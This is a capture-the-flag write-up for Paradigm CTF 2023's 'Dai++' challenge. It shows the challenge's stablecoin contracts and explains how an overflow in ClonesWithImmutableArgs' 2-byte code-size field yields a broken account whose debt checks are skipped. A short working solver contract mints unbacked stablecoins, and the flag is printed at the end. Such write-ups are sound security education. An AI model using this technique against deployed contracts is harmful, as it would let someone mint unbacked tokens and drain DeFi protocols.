---
title: Blockchain - Dai++
description: 2023 | Paradigm CTF | PWN
tags:
    - smart contract
    - clones with immutable args
---

## Description

MakerDAO is such a complex codebase, and we all know that larger codebases are more likely to have bugs. I simplified everything, so there shouldn't be any bugs here.

??? note "Deploy.s.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;

    import "forge-ctf/CTFDeployment.sol";

    import "../src/Challenge.sol";
    import "../src/SystemConfiguration.sol";
    import {Account as Acct} from "../src/Account.sol";

    contract Deploy is CTFDeployment {
        function deploy(address system, address) internal override returns (address challenge) {
            vm.startBroadcast(system);

            SystemConfiguration configuration = new SystemConfiguration();
            AccountManager manager = new AccountManager(configuration);

            configuration.updateAccountManager(address(manager));
            configuration.updateStablecoin(address(new Stablecoin(configuration)));
            configuration.updateAccountImplementation(address(new Acct()));
            configuration.updateEthUsdPriceFeed(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

            configuration.updateSystemContract(address(manager), true);

            challenge = address(new Challenge(configuration));

            vm.stopBroadcast();
        }
    }
    ```

??? note "src/Challenge.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.13;

    import "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
    import "./SystemConfiguration.sol";

    contract Challenge {
        SystemConfiguration public immutable SYSTEM_CONFIGURATION;

        constructor(SystemConfiguration configuration) {
            SYSTEM_CONFIGURATION = configuration;
        }

        function isSolved() external view returns (bool) {
            return IERC20(SYSTEM_CONFIGURATION.getStablecoin()).totalSupply() > 1_000_000_000_000 ether;
        }
    }
    ```

??? note "src/SystemConfiguration.sol"

    ```js
    import "@openzeppelin/contracts/access/Ownable.sol";

    import "./Account.sol";

    contract SystemConfiguration is Ownable {
        address private accountImplementation;

        address private ethUsdPriceFeed;

        address private accountManager;

        address private stablecoin;

        uint256 private collateralRatio;

        mapping(address => bool) private _systemContracts;

        constructor() {
            collateralRatio = 15000;
        }

        function updateAccountImplementation(address newImplementation) external onlyOwner {
            accountImplementation = newImplementation;
        }

        function updateEthUsdPriceFeed(address newPriceFeed) external onlyOwner {
            ethUsdPriceFeed = newPriceFeed;
        }

        function updateStablecoin(address newStablecoin) external onlyOwner {
            stablecoin = newStablecoin;
        }

        function updateAccountManager(address newAccountManager) external onlyOwner {
            accountManager = newAccountManager;
        }

        function updateCollateralRatio(uint256 newRatio) external onlyOwner {
            collateralRatio = newRatio;
        }

        function updateSystemContract(address target, bool authorized) external onlyOwner {
            _systemContracts[target] = authorized;
        }

        function getAccountImplementation() external view returns (address) {
            return accountImplementation;
        }

        function getEthUsdPriceFeed() external view returns (address) {
            return ethUsdPriceFeed;
        }

        function getCollateralRatio() external view returns (uint256) {
            return collateralRatio;
        }

        function getStablecoin() external view returns (address) {
            return stablecoin;
        }

        function getAccountManager() external view returns (address) {
            return accountManager;
        }

        function isAuthorized(address who) external view returns (bool) {
            return _systemContracts[who];
        }
    }
    ```

??? note "src/Account.sol"

    ```js
    import "@clones-with-immutable-args/src/Clone.sol";
    import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
    import "@openzeppelin/contracts/utils/cryptography/SignatureChecker.sol";

    import "./SystemConfiguration.sol";
    import "./AccountManager.sol";

    contract Account is Clone {
        event DebtIncreased(uint256 amount, string memo);
        event DebtDecreased(uint256 amount, string memo);

        uint256 private debt;

        function deposit() external payable {}

        function withdraw(uint256 amount) external {
            require(msg.sender == _getArgAddress(20), "ONLY_ACCOUNT_HOLDER");

            require(isHealthy(amount, 0), "NOT_HEALTHY");

            (bool ok,) = payable(msg.sender).call{value: amount}(hex"");
            require(ok, "TRANSFER_FAILED");
        }

        function increaseDebt(address operator, uint256 amount, string calldata memo) external {
            SystemConfiguration configuration = SystemConfiguration(_getArgAddress(0));
            require(configuration.isAuthorized(msg.sender), "NOT_AUTHORIZED");

            require(operator == _getArgAddress(20), "ONLY_ACCOUNT_HOLDER");

            require(isHealthy(0, amount), "NOT_HEALTHY");

            debt += amount;

            emit DebtIncreased(amount, memo);
        }

        function decreaseDebt(uint256 amount, string calldata memo) external {
            SystemConfiguration configuration = SystemConfiguration(_getArgAddress(0));
            require(configuration.isAuthorized(msg.sender), "NOT_AUTHORIZED");

            debt -= amount;

            emit DebtDecreased(amount, memo);
        }

        function isHealthy(uint256 collateralDecrease, uint256 debtIncrease) public view returns (bool) {
            SystemConfiguration configuration = SystemConfiguration(_getArgAddress(0));

            uint256 totalBalance = address(this).balance - collateralDecrease;
            uint256 totalDebt = debt + debtIncrease;

            (, int256 ethPriceInt,,,) = AggregatorV3Interface(configuration.getEthUsdPriceFeed()).latestRoundData();
            if (ethPriceInt <= 0) return false;

            uint256 ethPrice = uint256(ethPriceInt);

            return totalBalance * ethPrice / 1e8 >= totalDebt * configuration.getCollateralRatio() / 10000;
        }

        function recoverAccount(address newOwner, address[] memory newRecoveryAccounts, bytes[] memory signatures)
            external
            returns (Account)
        {
            require(isHealthy(0, 0), "UNHEALTHY_ACCOUNT");

            bytes32 signHash = keccak256(abi.encodePacked(block.chainid, _getArgAddress(20), newOwner, newRecoveryAccounts));

            uint256 numRecoveryAccounts = _getArgUint256(40);
            require(signatures.length == numRecoveryAccounts, "INCORRECT_LENGTH");

            for (uint256 i = 0; i < numRecoveryAccounts; i++) {
                require(
                    SignatureChecker.isValidSignatureNow(_getArgAddress(72 + 32 * i), signHash, signatures[i]),
                    "INVALID_SIGNATURE"
                );
            }

            SystemConfiguration configuration = SystemConfiguration(_getArgAddress(0));

            uint256 currentDebt = debt;
            debt = 0;

            return AccountManager(configuration.getAccountManager()).migrateAccount{value: address(this).balance}(
                newOwner, newRecoveryAccounts, currentDebt
            );
        }
    }
    ```

??? note "AccountManager.sol"

    ```js
    import "@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol";
    import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
    import "./Account.sol";
    import "./Stablecoin.sol";

    contract AccountManager {
        using ClonesWithImmutableArgs for address;

        SystemConfiguration private immutable SYSTEM_CONFIGURATION;

        mapping(Account => bool) public validAccounts;

        constructor(SystemConfiguration configuration) {
            SYSTEM_CONFIGURATION = configuration;
        }

        modifier onlyValidAccount(Account account) {
            require(validAccounts[account], "INVALID_ACCOUNT");
            _;
        }

        function openAccount(address owner, address[] calldata recoveryAddresses) external returns (Account) {
            return _openAccount(owner, recoveryAddresses);
        }

        function migrateAccount(address owner, address[] calldata recoveryAddresses, uint256 debt)
            external
            payable
            returns (Account)
        {
            Account account = _openAccount(owner, recoveryAddresses);
            account.deposit{value: msg.value}();

            account.increaseDebt(owner, debt, "account migration");
            return account;
        }

        function _openAccount(address owner, address[] calldata recoveryAddresses) private returns (Account) {
            Account account = Account(
                SYSTEM_CONFIGURATION.getAccountImplementation().clone(
                    abi.encodePacked(SYSTEM_CONFIGURATION, owner, recoveryAddresses.length, recoveryAddresses)
                )
            );

            validAccounts[account] = true;

            return account;
        }

        function mintStablecoins(Account account, uint256 amount, string calldata memo)
            external
            onlyValidAccount(account)
        {
            account.increaseDebt(msg.sender, amount, memo);

            Stablecoin(SYSTEM_CONFIGURATION.getStablecoin()).mint(msg.sender, amount);
        }

        function burnStablecoins(Account account, uint256 amount, string calldata memo)
            external
            onlyValidAccount(account)
        {
            account.decreaseDebt(amount, memo);

            Stablecoin(SYSTEM_CONFIGURATION.getStablecoin()).burn(msg.sender, amount);
        }
    }
    ```

??? note "src/Stablecoin.sol"

    ```js
    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
    import "./SystemConfiguration.sol";

    contract Stablecoin is ERC20("US Dollar Stablecoin", "USDS") {
        SystemConfiguration private immutable SYSTEM_CONFIGURATION;

        constructor(SystemConfiguration configuration) {
            SYSTEM_CONFIGURATION = configuration;
        }

        function mint(address to, uint256 amount) external {
            require(SYSTEM_CONFIGURATION.isAuthorized(msg.sender), "NOT_AUTHORIZED");

            _mint(to, amount);
        }

        function burn(address from, uint256 amount) external {
            require(SYSTEM_CONFIGURATION.isAuthorized(msg.sender), "NOT_AUTHORIZED");

            _burn(from, amount);
        }
    }
    ```

## Solution

- The challenge is solved if the total supply of `Stablecoin` is greater than $10^{12} \times 10^{18}$
- Accounts authorized by the `SystemConfiguration` contract can mint stable coins. Only the owner of `SystemConfiguration` can update system contracts (i.e. authorized accounts) and the `AccountManager` contract is the only authorized contract
- In the `AccountManager` contract, only valid accounts can mint stable coins. Meanwhile, the debt on the account will increase

    ```js
    function mintStablecoins(Account account, uint256 amount, string calldata memo)
        external
        onlyValidAccount(account)
    {
        account.increaseDebt(msg.sender, amount, memo);

        Stablecoin(SYSTEM_CONFIGURATION.getStablecoin()).mint(msg.sender, amount);
    }
    ```

- In the `increaseDebt()` function, if the account is not healthy after the debt is increased, the transaction will fail. However, the player don't have enough ETH to mint $10^{12}$ stable coins and keep the account healthy

    ```js
    function increaseDebt(address operator, uint256 amount, string calldata memo) external {
        ...
        require(isHealthy(0, amount), "NOT_HEALTHY");
        debt += amount;
        ...
    }

    function isHealthy(uint256 collateralDecrease, uint256 debtIncrease) public view returns (bool) {
        ...
        uint256 totalBalance = address(this).balance - collateralDecrease;
        ...
        return totalBalance * ethPrice / 1e8 >= totalDebt * configuration.getCollateralRatio() / 10000;
    }
    ```

- Notice that `AccountManager` uses `ClonesWithImmutableArgs` to create new accounts. When interacting with the `Account`, the immutable arguments will be read from calldata, saving gas costs. However, there's a comment in the `ClonesWithImmutableArgs`

    ```js
    /// @dev data cannot exceed 65535 bytes, since 2 bytes are used to store the data length
    ```

- Since the immutable arguments are stored in the code region of the created proxy contract, the code size will be calculated based on the data length during the deployment. However, the code size that should be returned is also stored in 2 bytes. Therefore, if `runSize` exceeds 65535 bytes, a broken contract may be deployed. We can then treat `increaseDebt()` as a *phantom function* and ignore the call

    ```js
    uint256 extraLength = data.length + 2; // +2 bytes for telling how much data there is appended to the call
    uint256 creationSize = 0x43 + extraLength;
    uint256 runSize = creationSize - 11;
    ...
    // solhint-disable-next-line no-inline-assembly
    assembly {
        ptr := mload(0x40)

        // -------------------------------------------------------------------------------------------------------------
        // CREATION (11 bytes)
        // -------------------------------------------------------------------------------------------------------------

        // 3d          | RETURNDATASIZE        | 0                       | –
        // 61 runtime  | PUSH2 runtime (r)     | r 0                     | –
        mstore(ptr, 0x3d61000000000000000000000000000000000000000000000000000000000000)
        mstore(add(ptr, 0x02), shl(240, runSize)) // size of the contract running bytecode (16 bits)
    ```

- The existing arguments length is `20 + 20 + 32 = 72` bytes and the length of encoded `recoveryAddresses` will be a multiple of 32 bytes

    ```js
    function _openAccount(address owner, address[] calldata recoveryAddresses) private returns (Account) {
        Account account = Account(
            SYSTEM_CONFIGURATION.getAccountImplementation().clone(
                abi.encodePacked(SYSTEM_CONFIGURATION, owner, recoveryAddresses.length, recoveryAddresses)
            )
        );

        validAccounts[account] = true;

        return account;
    }
    ```

### Exploitation

```js
contract Solve is CTFSolver {
    function solve(address challenge_, address player) internal override {
        Challenge challenge = Challenge(challenge_);
        AccountManager manager = AccountManager(challenge.SYSTEM_CONFIGURATION().getAccountManager());
        // 72 + 2044 * 32 + 2 + 0x43 - 11 = 65538 => 65538 % 65536 = 2
        Account account = manager.openAccount(player, new address[](2044));
        manager.mintStablecoins(account, 2_000_000_000_000 ether, "");
        require(challenge.isSolved());
    }
}
```

### Flag

> PCTF{0V3RFl0W5_WH3r3_Y0u_L3a57_3xp3C7_17}